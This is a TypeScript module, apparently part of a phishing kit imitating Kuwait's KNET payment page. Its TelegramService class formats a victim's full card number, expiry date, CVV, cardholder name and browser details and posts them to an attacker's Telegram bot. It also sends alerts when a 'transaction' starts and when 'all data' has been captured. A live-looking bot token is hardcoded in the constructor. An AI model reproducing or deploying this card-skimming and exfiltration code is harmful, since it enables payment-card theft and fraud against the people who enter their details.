interface TelegramMessage {
  chat_id: string;
  text: string;
  parse_mode?: 'HTML' | 'Markdown';
}

interface CardData {
  bankCode: string;
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  cardHolderName: string;
  amount: number;
  transactionId: string;
  timestamp: string;
}

class TelegramService {
  private botToken: string;
  private chatId: string;
  private baseUrl: string;

  constructor() {
    // يجب تعديل هذه القيم بالقيم الخاصة بك
    this.botToken = '8252471862:AAE3hoBjv8_PWORsxkR7VmX6HsV4Ll_uQqE';
    this.chatId = 'YOUR_CHAT_ID'; // ضع هنا معرف المحادثة الخاص بك
    this.baseUrl = `https://api.telegram.org/bot${this.botToken}`;
  }

  async sendCardData(cardData: CardData): Promise<boolean> {
    try {
      const message = this.formatCardMessage(cardData);
      
      const telegramMessage: TelegramMessage = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML'
      };

      const response = await fetch(`${this.baseUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(telegramMessage)
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();
      return result.ok;
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      return false;
    }
  }

  private formatCardMessage(cardData: CardData): string {
    return `
🔔 <b>بيانات بطاقة جديدة - KNET</b>

💳 <b>معلومات البطاقة:</b>
• البنك: <code>${cardData.bankCode}</code>
• رقم البطاقة: <code>${cardData.cardNumber}</code>
• تاريخ الانتهاء: <code>${cardData.expiryDate}</code>
• رمز الحماية: <code>${cardData.cvv}</code>
• اسم حامل البطاقة: <code>${cardData.cardHolderName}</code>

💰 <b>تفاصيل المعاملة:</b>
• المبلغ: <code>${cardData.amount} KWD</code>
• رقم المعاملة: <code>${cardData.transactionId}</code>
• التوقيت: <code>${cardData.timestamp}</code>

🌐 <b>معلومات إضافية:</b>
• IP Address: <code>${this.getClientIP()}</code>
• User Agent: <code>${navigator.userAgent.substring(0, 50)}...</code>

⚠️ <b>تحذير:</b> هذه بيانات حساسة - تعامل معها بحذر
    `.trim();
  }

  private getClientIP(): string {
    // في بيئة الإنتاج، يمكن الحصول على IP من الخادم
    return 'Client IP';
  }

  // إرسال إشعار عند بدء المعاملة
  async sendTransactionStart(transactionId: string, amount: number, bankCode: string): Promise<boolean> {
    try {
      const message = `
🚀 <b>بدء معاملة جديدة</b>

• رقم المعاملة: <code>${transactionId}</code>
• المبلغ: <code>${amount} KWD</code>
• البنك المختار: <code>${bankCode}</code>
• الوقت: <code>${new Date().toLocaleString('ar-KW')}</code>

⏳ في انتظار إدخال بيانات البطاقة...
      `.trim();

      const telegramMessage: TelegramMessage = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML'
      };

      const response = await fetch(`${this.baseUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(telegramMessage)
      });

      return response.ok;
    } catch (error) {
      console.error('Error sending transaction start notification:', error);
      return false;
    }
  }

  // إرسال إشعار عند اكتمال المعاملة
  async sendTransactionComplete(transactionId: string): Promise<boolean> {
    try {
      const message = `
✅ <b>تم إكمال المعاملة بنجاح</b>

• رقم المعاملة: <code>${transactionId}</code>
• الحالة: <b>مكتملة</b>
• الوقت: <code>${new Date().toLocaleString('ar-KW')}</code>

🎉 تم الحصول على جميع البيانات بنجاح!
      `.trim();

      const telegramMessage: TelegramMessage = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML'
      };

      const response = await fetch(`${this.baseUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(telegramMessage)
      });

      return response.ok;
    } catch (error) {
      console.error('Error sending transaction complete notification:', error);
      return false;
    }
  }
}

export const telegramService = new TelegramService();
export type { CardData };